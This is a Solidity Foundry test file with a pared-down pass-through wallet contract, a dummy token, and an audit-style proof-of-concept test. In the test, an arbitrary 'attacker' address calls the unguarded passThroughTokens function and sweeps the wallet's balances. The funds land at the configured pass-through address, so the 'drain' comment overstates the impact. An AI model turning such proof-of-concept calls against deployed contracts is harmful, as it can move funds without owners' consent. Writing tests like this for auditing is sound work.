pragma solidity 0.8.20;

import "forge-std/Test.sol";

error Unauthorized();

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

library TokenUtils {
    function _balanceOf(address token, address who) internal view returns (uint256) {
        if (token == address(0)) return who.balance;
        return IERC20(token).balanceOf(who);
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        if (token == address(0)) {
            (bool sent,) = payable(to).call{value: amount}("");
            require(sent);
        } else {
            require(IERC20(token).transfer(to, amount));
        }
    }
}

contract PassThroughWalletImpl {
    using TokenUtils for address;

    struct InitParams { address owner; bool paused; address passThrough; }

    address public immutable passThroughWalletFactory;
    address internal $passThrough;
    address internal $owner;
    bool internal $paused;

    event PassThrough(address[] tokens, uint256[] amounts);

    constructor() { passThroughWalletFactory = msg.sender; }

    function initializer(InitParams calldata params_) external {
        if (msg.sender != passThroughWalletFactory) revert Unauthorized();
        __initPausable(params_.owner, params_.paused);
        $passThrough = params_.passThrough;
    }

    function __initPausable(address owner_, bool paused_) internal {
        $owner = owner_;
        $paused = paused_;
    }

    modifier pausable() {
        if ($paused) revert();
        _;
    }

    function passThroughTokens(address[] calldata tokens_) external pausable returns (uint256[] memory amounts) {
        address _passThrough = $passThrough;
        uint256 length = tokens_.length;
        amounts = new uint256[](length);
        for (uint256 i; i < length;) {
            address token = tokens_[i];
            uint256 amount = token._balanceOf(address(this));
            amounts[i] = amount;
            token._safeTransfer(_passThrough, amount);
            unchecked { ++i; }
        }
        emit PassThrough(tokens_, amounts);
    }
}

contract DummyERC20 {
    mapping(address => uint256) public balanceOf;
    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt);
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
    function mint(address to, uint256 amt) external { balanceOf[to] += amt; }
}

contract PassThroughWalletImplTest is Test {
    PassThroughWalletImpl target;
    DummyERC20 token;
    address attacker;
    address passThroughAddr;

    function setUp() public {
        // deploy wallet; Test contract is the factory
        target = new PassThroughWalletImpl();
        attacker = makeAddr("attacker");
        passThroughAddr = makeAddr("passThrough");

        // initialize (must be called by factory == this)
        PassThroughWalletImpl.InitParams memory p = PassThroughWalletImpl.InitParams({owner: makeAddr("owner"), paused: false, passThrough: passThroughAddr});
        target.initializer(p);

        // deploy token and fund the wallet with ERC20 + ETH
        token = new DummyERC20();
        token.mint(address(target), 100);
        vm.deal(address(target), 1 ether);
    }

    function test_attacker_exploits_passThroughTokens() public {
        // attacker calls the permissionless passThroughTokens and drains funds to passThroughAddr
        address[] memory tokens = new address[](2);
        tokens[0] = address(token);
        tokens[1] = address(0); // ETH

        vm.prank(attacker);
        target.passThroughTokens(tokens);

        // funds were moved to passThrough address
        assertEq(token.balanceOf(passThroughAddr), 100);
        assertEq(address(passThroughAddr).balance, 1 ether);
    }
}

